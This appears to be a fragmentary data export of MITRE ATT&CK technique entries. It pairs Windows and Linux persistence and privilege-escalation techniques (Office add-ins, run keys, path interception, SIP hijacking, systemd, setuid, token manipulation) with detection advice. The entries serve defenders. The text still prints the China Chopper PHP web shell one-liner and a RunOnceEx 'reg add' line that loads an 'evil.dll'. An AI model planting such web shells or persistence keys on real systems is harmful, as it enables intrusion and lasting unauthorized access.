        registry key an adversary can specify an arbitrary location, file name, and
        file extension to use for the template that will be loaded on application

        add functionality to Office programs. (Citation: Microsoft Office Add-ins)\n\nAdd-ins
        can also be used to obtain persistence because they can be set to execute
        code when an Office application starts. There are different types of add-ins
        that can be used by the various Office products; including Word/Excel add-in
        Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins,
        automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO)
        add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation:
        FireEye Mail CDS 2018)\n\n### Outlook Rules, Forms, and Home Page\n\nA variety
        of features have been discovered in Outlook that can be abused to obtain persistence,
        such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub)
        These persistence mechanisms can work within Outlook or be used through Office
        365.(Citation: TechNet O365 Outlook Rules)\n\nOutlook rules allow a user to
        define automated behavior to manage email messages. A benign rule might, for
        example, automatically move an email to a particular folder in Outlook if
        it contains specific words from a specific sender. Malicious Outlook rules
        can be created that can trigger code execution when an adversary sends a specifically
        crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOutlook
        forms are used as templates for presentation and functionality in Outlook
        messages. Custom Outlook Forms can be created that will execute code when
        a specifically crafted email is sent by an adversary utilizing the same custom
        Outlook form.(Citation: SensePost Outlook Forms)\n\nOutlook Home Page is a
        legacy feature used to customize the presentation of Outlook folders. This
        feature allows for an internal or external URL to be loaded and presented
        whenever a folder is opened. A malicious HTML page can be crafted that will
        execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook
        Home Page)\n\nTo abuse these features, an adversary requires prior access
        to the user’s Outlook mailbox, either via an Exchange/OWA server or via the
        client application. Once malicious rules, forms, or Home Pages have been added
        to the user’s mailbox, they will be loaded when Outlook is started. Malicious
        Home Pages will execute when the right Outlook folder is loaded/reloaded while
        malicious rules and forms will execute when an adversary sends a specifically
        crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation:

        Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)

        Monitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins)

        Non-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.

        For the Outlook rules and forms methods, Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)

      name: Path Interception
      description: |-
        Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)

        There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.

        ### Unquoted Paths
        Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)

        ### PATH Environment Variable Misconfiguration
        The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\system32</code> (e.g., <code>C:\Windows\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

        For example, if <code>C:\example path</code> precedes <code>C:\Windows\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\example path</code> will be called instead of the Windows system "net" when "net" is executed from the command-line.

        ### Search Order Hijacking
        Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

        For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)

        Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

      description: "Port Knocking is a well-established method used by both defenders
        and adversaries to hide open ports from access. To enable a port, an adversary
        sends a series of packets with certain characteristics before the port will
        be opened. Usually this series of packets consists of attempted connections
        to a predefined sequence of closed ports, but can involve unusual flags, specific
        strings or other unique characteristics. After the sequence is completed,
        opening a port is often accomplished by the host based firewall, but could
        also be implemented by custom software. \n\nThis technique has been observed
        to both for the dynamic opening of a listening port as well as the initiating
        of a connection to a listening server on a different system.\n\nThe observation
        of the signal packets to trigger the communication can be conducted through
        different methods. One means, originally implemented by Cd00r (Citation: Hartrell
        cd00r 2002), is to use the libpcap libraries to sniff for the packets in question.
        Another method leverages raw sockets, which enables the malware to use ports
        that are already open for use by other programs."

        Existing methods of detecting remote access tools are helpful. Backup remote access tools or other access points may not have established command and control channels open during an intrusion, so the volume of data transferred may not be as high as the primary channel unless access is lost.

        Detection of tools based on beacon traffic, Command and Control protocol, or adversary infrastructure require prior threat intelligence on tools, IP addresses, and/or domains the adversary may use, along with the ability to detect use at the network boundary. Prior knowledge of indicators of compromise may also help detect adversary tools at the endpoint if tools are available to scan for those indicators.

        If an intrusion is in progress and sufficient endpoint data or decoded command and control traffic is collected, then defenders will likely be able to detect additional tools dropped as the adversary is conducting the operation.

        For alternative access using externally accessible VPNs or remote services, follow detection recommendations under [Valid Accounts](https://attack.mitre.org/techniques/T1078) and [External Remote Services](https://attack.mitre.org/techniques/T1133) to collect account use information.

      description: |-
        Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

        The following run keys are created by default on Windows systems:
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

        The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

        The following Registry keys can be used to set startup folder items for persistence:
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
        * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

        The following Registry keys can control automatic startup of services during boot:
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

        Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
        * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
        * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

        The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

        Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

        By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


        Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

        Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.

        Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

      name: SIP and Trust Provider Hijacking
      description: |-
        In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)

        Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

        Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).
        * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
        * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
        * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).

        Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)

Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033).

        Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)

        * Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
        * Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
        * Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
        * Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
        * Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
        * Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Adversaries may abuse legitimate extensible development features of server applications to establish persistent access to systems. Enterprise server applications may include features that allow application developers to write and install software to extend the functionality of the main application. Adversaries may install malicious software components to maliciously extend and abuse server applications.

        ###Transport Agent
        Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.

        Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.

        ###SQL Stored Procedures
        SQL stored procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as <code>xp_cmdshell</code> for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017)

        Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures, these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)

      description: |-
        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)

        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)

      x_mitre_detection: |-
        Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

      description: |-
        When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

        An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).

      description: "Systemd services can be used to establish persistence on a Linux
        system. The systemd service manager is commonly used for managing background
        daemon processes (also known as services) and other system resources.(Citation:
        Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd
        29SEP2018) Systemd is the default initialization (init) system on many Linux
        distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora
        15, and replaces legacy init systems including SysVinit and Upstart while
        remaining backwards compatible with the aforementioned init systems.\n\nSystemd
        utilizes configuration files known as service units to control how services
        boot and under what conditions. By default, these unit files are stored in
        the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code>
        directories and have the file extension <code>.service</code>. Each service
        unit file may contain numerous directives that can execute system commands.
        \n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution
        of commands when a services is started manually by 'systemctl' or on system
        start if the service is set to automatically start. \n* ExecReload directive
        covers when a service restarts. \n* ExecStop and ExecStopPost directives cover
        when a service is stopped or manually by 'systemctl'.\n\nAdversaries have
        used systemd functionality to establish persistent access to victim systems
        by creating and/or modifying service unit files that cause systemd to execute
        malicious commands at recurring intervals, such as at system boot.(Citation:
        Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation:
        Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation:
        acroread package compromised Arch Linux Mail 8JUL2018)\n\nWhile adversaries
        typically require root privileges to create/modify service unit files in the
        <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code>
        directories, low privilege users can create/modify service unit files in directories
        such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation:

        Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

        Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

        Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.

        The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)

        Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)

        Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)

        account using Credential Access techniques or capture credentials earlier
        in their reconnaissance process through social engineering for means of gaining
        Initial Access. \n\nAccounts that an adversary may use can fall into three
        categories: default, local, and domain accounts. Default accounts are those
        that are built-into an OS such as Guest or Administrator account on Windows
        systems or default factory/provider set accounts on other types of systems,
        software, or devices. Local accounts are those configured by an organization
        for use by users, remote support, services, or for administration on a single
        system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts
        are those managed by Active Directory Domain Services where access and permissions
        are configured across systems and services that are part of that domain. Domain
        accounts can cover users, administrators, and services.\n\nCompromised credentials
        may be used to bypass access controls placed on various resources on systems
        within the network and may even be used for persistent access to remote systems
        and externally available services, such as VPNs, Outlook Web Access and remote
        desktop. Compromised credentials may also grant an adversary increased privilege
        to specific systems or access to restricted areas of the network. Adversaries
        may choose not to use malware or tools in conjunction with the legitimate
        access those credentials provide to make it harder to detect their presence.\n\nDefault
        accounts are also not limited to Guest and Administrator on client machines,
        they also include accounts that are preset for equipment such as network devices
        and computer applications whether they are internal, open source, or COTS.
        Appliances that come preset with a username and password combination pose
        a serious threat to organizations that do not change it post installation,
        as they are easy targets for an adversary. Similarly, adversaries may also
        utilize publicly disclosed private keys, or stolen private keys, to legitimately
        connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021)
        (Citation: Metasploit SSH Module)\n\nThe overlap of account access, credentials,
        and permissions across a network of systems is of concern because the adversary
        may be able to pivot across accounts and systems to reach a high level of
        access (i.e., domain or enterprise administrator) to bypass access controls
        set within the enterprise. (Citation: TechNet Credential Theft)"

        A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

        Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013)

        <code><?php @eval($_POST['password']);></code>

        Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running [cmd](https://attack.mitre.org/software/S0106) or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)

      name: Access Token Manipulation
      description: "Windows uses access tokens to determine the ownership of a running
        process. A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        When this occurs, the process also takes on the security context associated
        with the new token. For example, Microsoft promotes the use of access tokens
        as a security best practice. Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>.(Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing. An adversary must already be in
        a privileged user context (i.e. administrator) to steal a token. However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system.(Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods:(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
        Impersonation/Theft** - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n**Create Process
        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n**Make
        and Impersonate Token** - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges.(Citation: Metasploit
        access token) The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens. (Citation: Cobalt Strike Access Token)"

        Specifically, analysts should look for use of the <code>runas</code> command.
        Detailed command-line logging is not enabled by default in Windows.(Citation:
        Microsoft Command-line Logging)\n\nIf an adversary is using a payload that
